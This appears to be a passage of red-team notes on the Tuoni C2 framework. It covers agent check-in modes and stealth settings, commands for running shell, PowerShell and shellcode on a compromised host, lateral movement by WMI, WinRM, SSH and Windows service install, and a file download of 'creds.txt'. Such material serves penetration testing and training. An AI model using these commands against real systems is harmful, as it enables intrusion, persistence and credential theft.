#### Agent
In Tuoni, the ***agent is the default payload*** for post-exploitation activities. The agent can communicate with Tuoni C2 in both `asynchronus` and `interactive` modes:

- **Asynchronous:** Default and Stealthier mode. The agent periodically calls back to Tuoni C2, retrieve tasks, and returns the output immediately. To increase stealth further, `instantResponse` can be set to `false`. This causes the response to be returned on the next check-in.

- **Interactive:** Tasks and outputs are handled in real-time. Although it is faster, it's more likely to be detected due to the constant communication.	

#### Running Shell Commands
Tuoni C2 offers several methods for executing commands directly on the compromised host:
- `cmd:` executes a command via the command prompt (cmd.exe).
- `powershell:` executes a command via PowerShell
- `execute-assembly:` executes a .NET assembly.
- `inject:` is used to invoke shellcode.
- `run:` uploads and runs an executable.
- `bof:` uploads and runs a beacon object file.

	**Example of Cmd**
	```
	tuoni> cmd --command whoami
	```

#### Lateral Movement
Tuoni C2 provides several out-of-the-box methods for lateral movement:

- `jump-wmi:` utilizes Windows Management Instrumentation (WMI) to execute commands on remote Windows systems.
- `jump-winrm:` leverages Windows Remote Management (WinRM) to ***enable PowerShell-based remoting***. Payloads are copied over via SMB and executed using PowerShell.
- `jump-ssh:` employs Secure Shell (SSH) to remotely access and execute commands on Unix/Windows systems.
- `jump-service:` ***installs and executes payloads as a Windows service*** on the target machine, granting persistent access .

	Example of Jump-Service
	```
	jump-service --target IP --payloadId 7 --execConf.execType SELF
	```

```
connect-smb --host IP -pipename MS_LEGIT_PIPE --execConf.execType SELF
```

#### Data Exfiltration
Using the agent console, you can navigate directories, retrieve files, and take screenshots of the user's current desktop.
Example: 
```
download --filepath creds.txt --execConf.execType SELF
```
